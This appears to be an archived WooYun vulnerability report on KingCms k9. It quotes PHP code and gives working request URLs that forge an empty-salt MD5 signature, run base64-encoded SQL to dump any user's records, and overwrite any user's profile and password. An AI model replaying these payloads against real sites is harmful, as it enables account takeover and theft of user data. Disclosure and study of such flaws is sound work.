{"id": 36155, "wybug_id": "wooyun-2015-0102489", "wybug_title": "KingCms最新版（k9）查看、修改所有用户所有信息", "wybug_corp": "KingCms", "wybug_author": "路人甲", "wybug_date": "2015-03-20 17:37", "wybug_open_date": "2015-05-04 17:38", "wybug_type": "非授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["越权操作", "认证缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-20：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-05-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： KingCms最新版（k9）查看、修改所有用户所有信息 详细说明：  朋友的公司想购买kingcms的授权，让我帮忙看下。发现kingcms很长一段时间没更新了，憋了一段时间放出了最新版的k9，官网下下来学习一下。在wooyun上看到了几个漏洞，如： WooYun: kingcms最新版sql注入漏洞 这里越权涉及到两个方面。0x00：先来看看如果查看所有会员信息。问题文件在/api/conn.php\n$get=$_GET;if(empty($get['jsoncallback'])) exit('非法提交!');$jsoncallback=$_GET['jsoncallback'];if(empty($_GET['USERID'])) exit($jsoncallback.'('.json_encode(array('error'=>\"用户ID不能为空，请求失败!\")).')');$str=new str;$db=new db;$file=new file;if(empty($get['SIGN'])) exit($jsoncallback.'('.json_encode(array('error'=>'丢失密文，禁止解析!')).')');//验证权限$sign=$get['SIGN'];unset($get['SIGN'],$get['_'],$get['jsoncallback']);$arr=array();foreach($get as $key => $val){\t$arr[$key]=$key.'='.urlencode($val);}ksort($arr);$param=implode('&',$arr);$sign1=md5($param.kc_config('system.salt'));if($sign!=$sign1) exit($jsoncallback.'('.json_encode(array('error'=>'审核失败,数据不一致!')).')');$arr=array();$get=array_map('base64_decode',$get);foreach($get as $key=>$val){\tif(substr($key,0,8)=='data_one'){\t\t$arr[$key]=$db->get_one($val);\t}elseif(substr($key,0,4)=='data'){\t\t$arr[$key]=$db->get($val);\t}elseif(substr($key,0,5)=='count'){\t\t$res=$db->get($val);\t\t$arr[$key]=empty($res[0]['c']) ? 0 : $res[0]['c'];\t}elseif(substr($key,0,5)=='newid'){\t\tlist($table,$id)=explode('|',$val,2);\t\t$arr[$key]=$db->newid($table,'',$id);\t}elseif(substr($key,0,6)=='getdir'){\t\tlist($path,$filetype)=explode('|',$val,2);\t\tif(empty($filetype)) $filetype='*';\t\t$arr[$key]=$file->getDir($path,$filetype);\t}elseif(substr($key,0,7)=='getfile'){\t\t$arr[$key]=$file->get($val);\t}elseif(substr($key,0,6)=='config'){\t\t$arr[$key]=kc_config($val);\t}elseif(substr($key,0,6)=='isfile'){\t\t$arr[$key]=is_file(ROOT.$val)?1:0;\t}}\n首先要绕过上面代码中的权限判断，其实就是计算出$sign1，然后使$_GET[‘SIGN’]与之相等即可。来看看$sign1是如何计算出来的\nforeach($get as $key => $val){\t$arr[$key]=$key.'='.urlencode($val);\t}ksort($arr);$param=implode('&',$arr);$sign1=md5($param.kc_config('system.salt'));\n参与计算的参数只有kc_config('system.salt')不是用户输入的，但是kingcms的这个参数是空，此因所有参与计算的参数都是用户输入的，按上面的算法简单计算一下就知道$sign1了，然后输入的$_GET[‘SIGN’]等于$sign1即可绕过权限判断。然后就执行了数据库查询并把查到的用户信息显示了出来。Paload(GET提交):\n/api/conn.php?USERID=MTAwMDA%3D&data=U0VMRUNUICogRlJPTSBraW5nX3VzZXIgIFdIRVJFIHVzZXJpZD0xMDAwNA%3D%3D&data_group=U0VMRUNUIGdpZCxncm91cG5hbWUsbm90ZXMgRlJPTSBraW5nX3VzZXJfZ3JvdXAg&data_group_bind=U0VMRUNUIGdpZCxyZW1vdmVkYXRlIEZST00ga2luZ191c2VyX2dyb3VwX2JpbmQgIFdIRVJFIHVzZXJpZD0xMDAwNA%3D%3D&data_role=U0VMRUNUIHJpZCxyb2xlbmFtZSxub3RlcyBGUk9NIGtpbmdfdXNlcl9yb2xlIA%3D%3D&data_role_bind=U0VMRUNUIHJpZCxyZW1vdmVkYXRlIEZST00ga2luZ191c2VyX3JvbGVfYmluZCAgV0hFUkUgdXNlcmlkPTEwMDA0&jsoncallback=j&SIGN=a9b456412499e56d335b7b340198b957&_=1426775906734\n上面的参数是经过base64编码的，如上面的参数data的value解码以后是SELECT * FROM king_user  WHERE userid=10004，通过构造sql语句（修改userid的值，遍历即可），base64编码以后提交，就可以查询所有会员的信息了。如下图\n\n0x01：下面看看如何修改所有会员的各种信息。/user/manage.php\n无关代码$array=array(\t\t'name'=>$_POST['name'],\t\t'tel'=>$_POST['tel'],\t\t'email'=>$_POST['email'],\t\t'qq'=>$_POST['qq'],\t\t'address'=>$_POST['address'],\t\t'qianming'=>$_POST['qianming'],\t\t\t);\t\tif(!empty($_POST['userpass'])) $array['userpass']=md5($_POST['userpass']);\tif(empty($userid)){\t\t$array['username']=$_POST['username'];\t\t$array['regdate']=TIME;\t\t$array['date']=TIME;\t\t$array['regip']=$str->ip();\t\t$array['ip']=$str->ip();\t\t$userid=$db->insert('%s_user',$array);\t\tkc_log(array('userid'=>$u->info['userid'],'app'=>'user','action'=>'USER_NEW','cid'=>$userid));\t}else{\t\t$db->update('%s_user',$array,'userid='.$userid);\t\t$db->delete('%s_user_group_bind','userid='.$userid);\t\t$db->delete('%s_user_role_bind','userid='.$userid);\t\tkc_log(array('userid'=>$u->info['userid'],'app'=>'user','action'=>'USER_EDIT','cid'=>$userid));\t}无关代码\n当userid不为空时，就会用提交的内容把该userid对应的用户信息修改，而userid是用户直接提交的。Payload（get提交）：\n/user/manage.php?jsoncallback=1&_=1&CMD=edit&&METHOD=POST&userid=10004&AJAX=1&USERID=10000&SIGN=89ee81f5f1f328f555ceb7e7655d9f2f&username=test&userpass=test&userpass1=test&role_removedate1=&group_removedate2=&group_removedate3=&group_removedate4=&name=%E6%B5%8B%E8%AF%95&tel=13500000000&email=test%40163.com&qq=1111&address=123&qianming=\n其中userid是你要修改的用户的id，可以遍历，参数SIGN是这样计算出来的\n<?php$str=\"10000\";//10000即POST参数中的USERID$str.=\"kingcms.com\";//网站域名$SIGN=md5($str);?>\n过程见下图\n\n   漏洞证明：  见 详细说明   修复方案：  加强权限验证   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}